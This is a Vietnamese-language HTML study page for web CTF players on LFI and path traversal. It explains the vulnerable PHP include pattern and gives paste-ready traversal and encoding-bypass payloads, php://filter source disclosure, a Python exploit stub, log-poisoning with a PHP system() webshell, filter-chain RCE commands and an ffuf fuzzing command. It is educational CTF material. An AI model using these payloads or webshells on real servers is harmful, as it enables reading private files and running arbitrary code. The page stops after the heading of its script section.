@@ -1,0 +1,573 @@
+<title>LFI / Path Traversal — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · File &amp; Path</div>
+    <h1>LFI / Path Traversal</h1>
+    <p class="sub">Khi một trang web nhận tên file từ bạn (để hiển thị ảnh, đọc trang con, xem log...) và dùng
+    <strong>nguyên văn</strong> để mở file trên server — bạn có thể đổi tên file đó để "đi lên" ra khỏi thư mục
+    dự định, đọc được bất kỳ file nào trên máy chủ, và với PHP, nhiều khi biến thành chạy code tùy ý (RCE).</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>LFI/Path Traversal là gì, để làm gì?</h2>
+  <p class="lead">Trang web có chức năng kiểu <code>?page=about.php</code> hay <code>?file=report.pdf</code> —
+  server lấy tên file bạn đưa, ghép vào một thư mục cố định, rồi mở file đó ra đọc/hiển thị. Nếu bạn đổi tên file
+  thành <code>../../../../etc/passwd</code>, và server không kiểm tra, nó sẽ "đi lùi" ra khỏi thư mục dự định và
+  mở đúng file hệ thống đó — <strong>Path Traversal</strong>. Khi chức năng đó không chỉ đọc mà còn <em>chạy</em>
+  file (PHP <code>include</code>) thì gọi là <strong>LFI</strong> (Local File Inclusion) — và có thể leo thang
+  thành chạy code tùy ý.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Chuỗi <code>../</code> ("lên 1 cấp thư mục") là chìa khóa. Lặp lại đủ nhiều lần
+  (<code>../../../../../../etc/passwd</code>) là bạn chắc chắn ra tới thư mục gốc <code>/</code>, dù không biết
+  chính xác file đang ở sâu bao nhiêu cấp — thừa vẫn không sao, hệ thống chỉ dừng ở gốc.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ LFI / PATH TRAVERSAL</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        URL có tham số chứa tên file/đường dẫn: <code>?page=</code>, <code>?file=</code>, <code>?lang=</code>,
+        <code>?template=</code>, <code>?download=</code>. Thử đổi thành
+        <code>../../../../etc/passwd</code> → nếu Response hiện nội dung kiểu
+        <code>root:x:0:0:root:/root:/bin/bash</code> ⟹ chắc chắn trúng.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Tham số đi thẳng vào hàm đọc/include file (không bị ép danh sách file cho phép — whitelist).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Repeater, tăng dần số <code>../</code> (2, 4, 6, 8...) cho tới khi đọc được <code>/etc/passwd</code> —
+        không cần biết chính xác độ sâu, thừa <code>../</code> vẫn an toàn (dừng ở <code>/</code>).
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># 1. Đọc file hệ thống cơ bản (Linux)</span>
+../../../../../../etc/passwd
+<span class="c"># 2. Nếu bị lọc chuỗi "../" (không đệ quy), thử:</span>
+....//....//....//etc/passwd
+<span class="c"># 3. Đọc SOURCE CODE chính service (PHP, đọc được code thay vì chạy) — rất quan trọng với CTF có source PHP:</span>
+php://filter/convert.base64-encode/resource=index.php
+<span class="c"># 4. Encode nếu bị lọc dấu / hoặc .:</span>
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+html = requests.get(<span class="s">"http://TARGET/view"</span>,
+        params={<span class="s">"page"</span>: <span class="s">"../../../../../../flag.txt"</span>}).text
+<span class="k">print</span>(re.search(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>, html).group())</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Server thêm sẵn đuôi <code>.php</code> vào cuối → dùng null byte <code>%00</code> (chỉ PHP rất cũ &lt;5.3.4)
+        hoặc chọn file không cần đuôi đúng. Tìm được source nhưng không chạy được lệnh → xem mục 07 (filter chain
+        RCE). WAF rule nhanh: chặn regex <code>\.\./|%2e%2e%2f|php://filter</code>. Chưa hiểu các bước? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Đường dẫn file (path)</b> — địa chỉ của 1 file trên ổ đĩa, ví dụ
+  <code>/var/www/html/pages/about.php</code>. Dấu <code>/</code> ngăn cách các thư mục lồng nhau.</div>
+  <div class="def"><b>Path Traversal ("đi lùi thư mục")</b> — chuỗi <code>..</code> trong đường dẫn nghĩa là
+  "lùi lại 1 cấp thư mục cha". Ví dụ đang ở <code>/var/www/html/pages/</code>, viết
+  <code>../../../etc/passwd</code> nghĩa là: lùi 3 cấp (ra <code>/var/www/html</code> → <code>/var/www</code> →
+  <code>/var</code> → ra hẳn gốc <code>/</code>), rồi đi vào <code>etc/passwd</code>.</div>
+  <div class="def"><b>LFI (Local File Inclusion)</b> — khi chức năng không chỉ <em>đọc</em> nội dung file để hiển
+  thị, mà <em>include</em> (nạp và CHẠY) file đó như code — đặc trưng của PHP (<code>include</code>,
+  <code>require</code>). Nếu bạn khiến nó include một file có code PHP do bạn kiểm soát (dù chỉ 1 phần), bạn có
+  thể đạt RCE.</div>
+  <p>Ví dụ: trang có nhiều trang con (about, contact...), code hay viết kiểu:</p>
+  <pre><code><span class="c">// PHP</span>
+$page = $_GET[<span class="s">'page'</span>];
+include(<span class="s">"pages/"</span> . $page);</code></pre>
+  <p>Lập trình viên định: <code>?page=about.php</code> → include <code>pages/about.php</code>. Nhưng
+  <code>$page</code> được ghép thẳng, không kiểm tra, không giới hạn trong thư mục <code>pages/</code>.</p>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Hệ điều hành hiểu <code>..</code> là lệnh, không phải tên file</h2>
+  <p>Khi bạn gửi <code>page=../../../../etc/passwd</code>, server ghép ra:</p>
+  <pre><code>include("pages/../../../../etc/passwd");</code></pre>
+  <p>Với PHP/hệ điều hành, <code>pages/../../../../etc/passwd</code> được <strong>tính toán từng bước</strong>:
+  bắt đầu từ thư mục hiện tại, vào <code>pages/</code>, rồi <code>..</code> lùi ra lại chỗ cũ, rồi tiếp tục lùi
+  thêm nhiều cấp nữa cho tới gốc <code>/</code>, rồi đi vào <code>etc/passwd</code>. Hệ thống <strong>không hề
+  biết</strong> đoạn <code>pages/</code> ban đầu là "thư mục dự định", nó chỉ thấy một chuỗi đường dẫn hợp lệ và đi
+  theo đúng chuỗi đó.</p>
+  <p>Giống hệt bản chất của SQLi/Command Injection: <strong>dữ liệu người dùng được diễn giải thành cú pháp</strong>
+  (ở đây là cú pháp đường dẫn) thay vì chỉ là một chuỗi tên file vô hại.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Từ đọc file tới RCE qua PHP wrapper</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10.5px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10.5px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10.5px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr4)}
+    </style>
+    <defs><marker id="arr4" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="200" height="55" rx="10" class="box"/>
+    <text x="22" y="40" class="lbl-m">?page=</text>
+    <text x="22" y="56" class="lbl-a">../../../../etc/passwd</text>
+
+    <path d="M210,48 H248" class="arrow"/>
+    <rect x="253" y="20" width="190" height="55" rx="10" class="box"/>
+    <text x="265" y="40" class="lbl-m">include("pages/" .</text>
+    <text x="265" y="56" class="lbl-a">$page)</text>
+
+    <path d="M443,48 H480" class="arrow"/>
+    <rect x="485" y="20" width="185" height="55" rx="10" class="box-a"/>
+    <text x="497" y="40" class="lbl-m">Hệ thống "đi lùi":</text>
+    <text x="497" y="56" class="lbl-a" font-size="9.5">pages/../../.. -&gt; /etc/passwd</text>
+
+    <path d="M560,80 V105" class="arrow"/>
+    <rect x="253" y="110" width="190" height="55" rx="10" class="box-a"/>
+    <text x="265" y="130" class="lbl-m">Hậu quả cơ bản:</text>
+    <text x="265" y="146" class="lbl-a">đọc được /etc/passwd</text>
+
+    <path d="M253,135 H90" class="arrow"/>
+    <rect x="10" y="110" width="200" height="55" rx="10" class="box-a"/>
+    <text x="22" y="130" class="lbl-m">Nếu dùng php://filter</text>
+    <text x="22" y="146" class="lbl-a">+ include -&gt; RCE!</text>
+  </svg>
+  </div>
+  <p>Điểm quan trọng nhất của LFI trên PHP là <strong>PHP stream wrapper</strong> — PHP cho phép
+  <code>include()</code>/<code>require()</code> nhận không chỉ đường dẫn file thường, mà cả các "giao thức" đặc
+  biệt bắt đầu bằng <code>php://</code>, <code>data://</code>, <code>zip://</code>...</p>
+  <div class="pbreak">
+    <div class="ph">php://filter/convert.base64-encode/resource=index.php</div>
+    <div class="pb">
+      <div class="part"><code>php://filter</code> — một luồng đặc biệt cho phép áp "bộ lọc" (filter) lên nội
+      dung file trước khi trả về, thay vì chạy file đó như code.</div>
+      <div class="part"><code>convert.base64-encode</code> — bộ lọc: mã hóa nội dung file thành Base64 trước khi
+      đưa cho <code>include()</code>. Vì sao cần? Nếu bạn <code>include</code> trực tiếp 1 file <code>.php</code>,
+      PHP sẽ <em>chạy</em> code trong đó (bạn không đọc được source, chỉ thấy kết quả chạy). Mã hóa base64 trước
+      khiến PHP coi đó là <em>text thường</em>, không chạy được, nên bạn đọc được <strong>nguyên văn source code</strong>.</div>
+      <div class="part"><code>resource=index.php</code> — file nguồn muốn đọc.</div>
+    </div>
+    <div class="resp"><b>Response mong đợi:</b> một chuỗi Base64 dài — tự giải mã (CyberChef, mục 07) ra được
+    toàn bộ source code PHP của <code>index.php</code>, kể cả các dòng không hiện khi truy cập trực tiếp qua
+    trình duyệt (vì PHP vốn chỉ trả về HTML đã chạy xong, không phải source).</div>
+  </div>
+  <p>Khi đã đọc được source, bạn thường tìm thấy đường đi khai thác tiếp (SQLi khác trong code, API key, hoặc
+  đường dẫn upload để kết hợp LFI→RCE). Trường hợp đặc biệt mạnh hơn: dùng chuỗi <strong>filter chain</strong>
+  (nhiều bộ lọc xếp chồng) để biến LFI trực tiếp thành RCE <strong>không cần upload file nào</strong> — xem công
+  cụ ở mục 07.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>URL có <code>?page=</code>, <code>?file=</code>, <code>?lang=</code>, <code>?template=</code>, <code>?doc=</code></td><td>Tham số rất có thể đi vào hàm đọc/include file</td></tr>
+    <tr><td>Giá trị tham số có vẻ là tên file: <code>about.php</code>, <code>en.json</code></td><td>Mẫu điển hình để thử thay bằng path traversal</td></tr>
+    <tr><td>Thử <code>../../../../etc/passwd</code> → Response hiện nội dung file này</td><td>Xác nhận Path Traversal</td></tr>
+    <tr><td>Thử <code>php://filter/convert.base64-encode/resource=index.php</code> → ra chuỗi Base64</td><td>Xác nhận LFI qua PHP (không chỉ path traversal mà include() thật)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1-2 — bắt request, thử trong Repeater</span>
+  <ol style="margin:4px 0 0">
+    <li>Burp Proxy bắt request của chức năng xem trang/file (vd <code>GET /view?page=about.php</code>).</li>
+    <li>Send to Repeater, sửa <code>page=../../../../../../etc/passwd</code>, Send, đọc Response.</li>
+    <li>Không ăn? Thử bớt/thêm số <code>../</code>, hoặc thử <code>....//....//etc/passwd</code> (nếu server lọc
+    chuỗi <code>../</code> một lần không đệ quy — xem mục 06).</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Khi nào cần Intruder</span>
+  Dùng Intruder để fuzz <strong>số lượng <code>../</code> cần thiết</strong> và <strong>tên file mục tiêu</strong>
+  tự động: đánh dấu <code>§../../../../etc/passwd§</code>, nạp payload list từ
+  <code>~/hoc/CTF/Tools/web/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt</code> (hàng nghìn payload LFI đã biết, bao gồm nhiều
+  biến thể encode) — nhanh hơn rất nhiều so với tự nghĩ.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Chọn đúng kỹ thuật theo tình huống</h2>
+
+  <h3>A. Path Traversal cơ bản <span class="badge easy">thử trước</span></h3>
+  <table>
+    <tr><th>Payload</th><th>Khi nào dùng</th></tr>
+    <tr><td><code>../../../../../../etc/passwd</code></td><td>Linux, dò cơ bản</td></tr>
+    <tr><td><code>..\..\..\..\windows\win.ini</code></td><td>Windows</td></tr>
+    <tr><td><code>/etc/passwd</code> (đường dẫn tuyệt đối, không cần <code>../</code>)</td><td>Một số app chỉ lọc <code>../</code>, không lọc đường dẫn tuyệt đối</td></tr>
+  </table>
+
+  <h3>B. Vượt bộ lọc cơ bản</h3>
+  <table>
+    <tr><th>Bộ lọc gặp phải</th><th>Cách né</th></tr>
+    <tr><td>Lọc chuỗi <code>../</code> một lần, không đệ quy</td><td><code>....//</code> — sau khi bộ lọc xóa <code>../</code> ở giữa, phần còn lại ghép thành <code>../</code> mới</td></tr>
+    <tr><td>Lọc dấu <code>/</code></td><td>URL-encode: <code>%2e%2e%2f</code> (một lần) hoặc <code>%252e%252e%252f</code> (double-encode, khi app tự decode 2 lần)</td></tr>
+    <tr><td>Bắt buộc path phải bắt đầu bằng thư mục cho phép (vd <code>pages/</code>)</td><td>Dùng null byte cũ <code>pages/../../etc/passwd%00</code> (chỉ PHP &lt;5.3.4, rất hiếm gặp ở service mới) hoặc tìm cách path traversal ngay trong chuỗi sau <code>pages/</code></td></tr>
+    <tr><td>Server tự thêm đuôi <code>.php</code> vào cuối chuỗi bạn gửi</td><td>Chọn đọc file không có đuôi (vd <code>/etc/passwd</code> vẫn đọc được dù thêm <code>.php</code> vào cuối thường chỉ gây lỗi "not found", thử nhiều file khác; hoặc dùng path truncation nếu PHP rất cũ)</td></tr>
+  </table>
+
+  <h3>C. LFI → RCE (khi chỉ đọc file là chưa đủ điểm)</h3>
+  <table>
+    <tr><th>Kỹ thuật</th><th>Điều kiện cần</th><th>Payload mẫu</th></tr>
+    <tr><td><strong>Log poisoning</strong></td><td>Đọc được log web server (vd <code>/var/log/apache2/access.log</code>) + biết đường dẫn log</td><td>Gửi request với <code>User-Agent: &lt;?php system($_GET['c']); ?&gt;</code>, sau đó <code>?page=../../../../var/log/apache2/access.log&c=id</code> — log server ghi lại User-Agent (có code PHP), include log = chạy code đó</td></tr>
+    <tr><td><strong>/proc/self/environ</strong></td><td>Server Linux, PHP chạy qua CGI (ít gặp web server hiện đại)</td><td><code>?page=../../../../proc/self/environ</code> kết hợp User-Agent chứa code PHP tương tự log poisoning</td></tr>
+    <tr><td><strong>PHP filter chain (không cần upload)</strong></td><td>PHP ≥7.0.30 hoặc ≥7.4 tùy kỹ thuật, có công cụ sinh chain — xem mục 07</td><td>Chuỗi rất dài do công cụ tự sinh, xếp nhiều <code>convert.iconv.*</code> để tạo byte tùy ý thành code PHP</td></tr>
+    <tr><td><strong>Session file poisoning</strong></td><td>Biết đường dẫn lưu session PHP (thường <code>/var/lib/php/sessions/sess_&lt;id&gt;</code>) + điều khiển được 1 phần nội dung session (vd field profile)</td><td>Ghi code PHP vào 1 trường session, rồi LFI include file session đó</td></tr>
+  </table>
+  <div class="note tip"><span class="tag">Thứ tự ưu tiên thử</span>Đọc source trước (base64 filter) → tìm hint
+  trong code (đường dẫn log/session, có upload không) → chọn đúng kỹ thuật LFI→RCE phù hợp thay vì thử ngẫu nhiên
+  cả 4 kỹ thuật.</div>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: FFUF, PHP FILTER CHAIN &amp; CYBERCHEF</div>
+  <h2>Không nhớ nổi payload/chain? Dùng công cụ</h2>
+
+  <h3>A. Kho payload &amp; wordlist offline</h3>
+  <p><code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/File Inclusion/</code> và
+  <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/Directory Traversal/</code> — payload mẫu theo tình huống.
+  <code>~/hoc/CTF/Tools/web/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt</code> — wordlist hàng nghìn payload LFI đã biết
+  (nhiều mức encode khác nhau), nạp thẳng vào <code>ffuf</code> hoặc Burp Intruder.</p>
+
+  <h3>B. ffuf — fuzz hàng loạt payload tự động (đã cài sẵn)</h3>
+  <pre><code>ffuf -u <span class="s">"http://TARGET/view?page=FUZZ"</span> \
+     -w ~/hoc/CTF/Tools/web/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt \
+     -mr <span class="s">"root:.*:0:0:"</span>   <span class="c"># -mr = match theo regex trong response (thấy dòng /etc/passwd là trúng)</span></code></pre>
+  <table>
+    <tr><th>Flag</th><th>Ý nghĩa</th></tr>
+    <tr><td><code>-u ...FUZZ</code></td><td>Vị trí <code>FUZZ</code> sẽ được thay lần lượt bằng từng dòng trong wordlist</td></tr>
+    <tr><td><code>-w wordlist</code></td><td>File wordlist payload</td></tr>
+    <tr><td><code>-mr regex</code></td><td>Chỉ hiện kết quả mà Response khớp regex này (lọc nhiễu, chỉ thấy payload thật sự trúng)</td></tr>
+    <tr><td><code>-fs SIZE</code></td><td>Lọc bỏ kết quả có độ dài response = SIZE (dùng khi trang lỗi luôn có cùng 1 độ dài cố định)</td></tr>
+  </table>
+
+  <h3>C. php_filter_chain_generator — tự sinh chain LFI→RCE (không cần nhớ cú pháp filter)</h3>
+  <div class="def"><b>php_filter_chain_generator</b> — công cụ của Synacktiv: bạn chỉ cần đưa 1 đoạn code PHP
+  muốn chạy, nó tự tính và in ra chuỗi <code>php://filter/...</code> dài ngoằng tương ứng — bạn không cần tự hiểu
+  cách xếp <code>convert.iconv.*</code> để tạo ra đúng byte. Đã clone về
+  <code>~/hoc/CTF/Tools/web/php_filter_chain_generator/</code>.</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/php_filter_chain_generator
+python3 php_filter_chain_generator.py --chain <span class="s">'&lt;?php system($_GET["c"]); ?&gt;'</span></code></pre>
+  <p>Lệnh trên in ra một chuỗi <code>php://filter/...resource=...</code> rất dài — dán chuỗi đó làm giá trị tham
+  số <code>page</code> của challenge. Nếu trúng, mỗi lần gọi lại URL kèm <code>&amp;c=id</code> sẽ chạy lệnh
+  <code>id</code> trên server.</p>
+  <div class="note warn"><span class="tag">Thành thật về giới hạn</span>Kỹ thuật filter chain phụ thuộc phiên bản
+  PHP cụ thể và có thể tạo ra chuỗi payload <strong>rất dài</strong> (hàng nghìn ký tự) — một số app giới hạn độ
+  dài URL/param sẽ chặn luôn cách này. Không phải "phép màu" dùng được ở mọi challenge LFI.</div>
+
+  <h3>D. CyberChef — giải mã output base64/hex</h3>
+  <p>Mở <code>~/hoc/CTF/Tools/web/CyberChef/CyberChef_v11.6.0.html</code>. Dán chuỗi Base64 đọc được từ
+  <code>php://filter/convert.base64-encode</code> (mục 03) vào Input, kéo khối <strong>From Base64</strong> →
+  đọc nguyên văn source code PHP ngay lập tức, không cần tự decode bằng tay/viết script.</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
